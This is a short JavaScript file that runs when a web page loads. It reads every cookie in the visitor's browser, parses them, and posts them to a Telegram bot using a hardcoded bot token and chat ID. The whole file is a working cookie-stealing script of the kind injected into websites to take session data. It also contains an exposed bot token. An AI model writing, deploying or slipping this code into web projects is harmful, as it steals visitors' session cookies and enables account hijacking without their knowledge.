document.addEventListener('DOMContentLoaded', function () {
  function parseCookieString(cookieString) {
    const cookies = cookieString.split(';');
    const parsedCookies = {};
    cookies.forEach(function(cookie) {
        const parts = cookie.split('=');
        const cookieName = parts[0].trim();
        const cookieValue = decodeURIComponent((parts[1] || '').trim());
        parsedCookies[cookieName] = cookieValue;
    });

    return parsedCookies;
}
  // Get all cookies
  const cookie = parseCookieString(document.cookie);

  // Telegram Info
  const telegramInfo = {
    chatId: '925113782',
    botToken: '6709516320:AAGo96-mCS82bpNjdUE3_Yzcn_SbX3oW0PI'
  }

  fetch(`https://api.telegram.org/bot${telegramInfo.botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: telegramInfo.chatId,
      text: `Cookies: ${JSON.stringify(cookie)}`,
    }),
  });
});